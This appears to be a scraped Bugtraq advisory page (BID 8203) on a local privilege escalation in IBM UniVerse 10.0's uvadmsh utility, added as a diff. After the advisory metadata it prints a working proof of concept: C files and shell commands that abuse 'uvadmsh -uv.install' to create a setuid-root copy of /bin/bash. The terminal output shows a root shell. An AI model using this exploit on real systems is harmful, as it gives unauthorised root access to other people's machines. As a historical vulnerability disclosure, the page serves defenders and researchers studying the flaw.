@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid8203<p><b><span style="font-size: 18pt;">IBM U2 UniVerse uvadmsh Privilege Escalation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/8203/info">info</a><br><a href="http://www.securityfocus.com/bid/8203/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/8203/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/8203/solution">solution</a><br><a href="http://www.securityfocus.com/bid/8203/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				8203
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 16 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 16 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to KF &lt;dotslash@snosoft.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					IBM UniVerse 10.0 .0.9<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following example was provided:<br/><br/>uvadm@vegeta uvadm$ cat &gt; /tmp/uv.install.c<br/>main()<br/>{<br/>setuid(0);<br/>system("cc -o /tmp/owned /tmp/owned.c");<br/>system("chmod 4755 /tmp/owned");<br/>}<br/><br/>uvadm@vegeta uvadm$ cc -o /tmp/uv.install /tmp/uv.install.c<br/>uvadm@vegeta uvadm$ cat &gt; /tmp/owned.c<br/>main()<br/>{<br/>setuid(0);<br/>system("/bin/bash");<br/>}<br/><br/>uvadm@vegeta uvadm$ ls -al /tmp/owned<br/>ls: /tmp/owned: No such file or directory<br/><br/>uvadm@vegeta uvadm$ /usr/ibm/uv/bin/uvadmsh -uv.install /tmp  <br/>uvadm@vegeta uvadm$ ls -al /tmp/owned<br/>-rwsr-xr-x    1 root     uvadm       11640 Jul  2 20:15 /tmp/owned<br/><br/>uvadm@vegeta uvadm$ /tmp/owned<br/>root@vegeta uvadm# id<br/>uid=0(root) gid=503(uvadm) groups=503(uvadm)
+	
+		<ul>
+</ul>
+</div>
